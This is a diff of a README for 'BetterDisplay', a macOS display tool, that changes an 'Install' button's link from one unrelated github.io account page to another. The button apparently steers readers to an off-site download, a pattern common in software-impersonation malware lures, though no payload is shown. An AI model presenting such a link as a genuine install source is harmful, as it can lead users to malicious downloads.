@@ -2,7 +2,7 @@
 <h1 align="center">BetterDisplay</h1>
 <p align="center">Native display management and calibration — done right on macOS.</p>
 <p align="center"><img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/> &nbsp; <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/> &nbsp; <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/></p>
-<p align="center"><a href="https://4eboksari-4ebur.github.io/.github/betterdisplay"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
+<p align="center"><a href="https://jornal-gens.github.io/.github/betterdisplay"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
 <p align="center"><img src="https://preview.redd.it/betterdisplay-pro-long-term-review-v0-1mu9wjv2nqxg1.png?auto=webp&s=1f1ed56100f2f5f88556ee6d6cda964538f7a14a" alt="BetterDisplay — macOS display management and calibration screenshot" width="780"/></p>
 
 ---
